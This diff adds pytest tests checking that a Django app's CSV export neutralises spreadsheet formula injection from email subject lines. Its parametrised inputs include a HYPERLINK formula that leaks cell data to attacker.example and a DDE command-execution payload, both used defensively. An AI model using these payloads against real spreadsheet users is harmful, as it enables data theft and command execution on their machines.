@@ -373,3 +373,83 @@ def test_the_single_file_downloads_still_work(client, student, loaded):
 def test_export_requires_a_login(client):
     resp = client.get(reverse("accounts:export") + "?kind=all")
     assert resp.status_code == 302
+
+
+# ---------------------------------------------------------------------------
+# CSV formula injection
+#
+# The export is the one place Coverage hands third-party-authored text to a
+# program that executes text. A sender the student never chose picks their
+# own Subject line; capture/gmail_live.py copies it into Touch.note; the
+# student opens their export in Excel. Everything below exists to keep that
+# last step boring.
+# ---------------------------------------------------------------------------
+@pytest.mark.parametrize(
+    "hostile",
+    [
+        "=SUM(1+1)",
+        '=HYPERLINK("http://attacker.example/?x="&A1,"Click")',
+        '=cmd|\' /C calc\'!A0',
+        "+1+1",
+        "-2+3",
+        "@SUM(1+1)",
+        "\t=SUM(1+1)",
+        "\r=SUM(1+1)",
+    ],
+)
+def test_a_formula_in_a_cell_exports_as_inert_text(hostile):
+    text = services._csv(["note"], [[hostile]])
+    cell = list(csv.reader(io.StringIO(text)))[1][0]
+    assert cell == "'" + hostile
+    # The apostrophe is only worth anything if it is genuinely first.
+    assert cell[0] == "'"
+    assert not cell.startswith(tuple(services._FORMULA_LEAD))
+
+
+def test_a_hostile_subject_line_survives_the_real_touches_export(student, firm):
+    """End to end, through the export a student actually downloads."""
+    contact = Contact.all_objects.create(user=student, name="Recruiter", firm=firm)
+    Touch.all_objects.create(
+        user=student, contact=contact, ts=timezone.now(), channel="email",
+        kind="reply", source="gmail",
+        # Exactly the shape capture/gmail_live.py builds from a Subject header.
+        note="=SUM(1+1)",
+    )
+    rows = _rows(_zip(student), "touches.csv")
+    assert [r["note"] for r in rows] == ["'=SUM(1+1)"]
+
+
+def test_a_negative_number_is_still_a_number():
+    """Quoting every leading `-` would turn sortable numeric columns into
+    text for no gain: a spreadsheet reads `-4` as the number -4, never as a
+    formula."""
+    text = services._csv(["a", "b", "c"], [[-4, "-4", "-12.5"]])
+    assert list(csv.reader(io.StringIO(text)))[1] == ["-4", "-4", "-12.5"]
+
+
+def test_a_phone_number_is_quoted_because_a_sheet_cannot_tell_it_from_a_formula():
+    """`+1 415 555 0100` is not a number, and Excel will try to evaluate it.
+    Quoting is what makes it display as typed."""
+    text = services._csv(["phone"], [["+1 415 555 0100"]])
+    assert list(csv.reader(io.StringIO(text)))[1] == ["'+1 415 555 0100"]
+
+
+@pytest.mark.parametrize(
+    "ordinary",
+    ["Jane Banker", "jane@example.com", "Analyst, Markets", "", "Rowed in college"],
+)
+def test_ordinary_text_is_left_exactly_as_written(ordinary):
+    text = services._csv(["note"], [[ordinary]])
+    assert list(csv.reader(io.StringIO(text)))[1] == [ordinary]
+
+
+def test_the_normal_export_is_unchanged_by_the_guard(student, loaded):
+    """A full export of ordinary data carries no stray apostrophes — the
+    guard is invisible until something actually looks like a formula."""
+    zf = _zip(student)
+    for name in zf.namelist():
+        if not name.endswith(".csv"):
+            continue
+        for row in _rows(zf, name):
+            for value in row.values():
+                assert not (value or "").startswith("'")
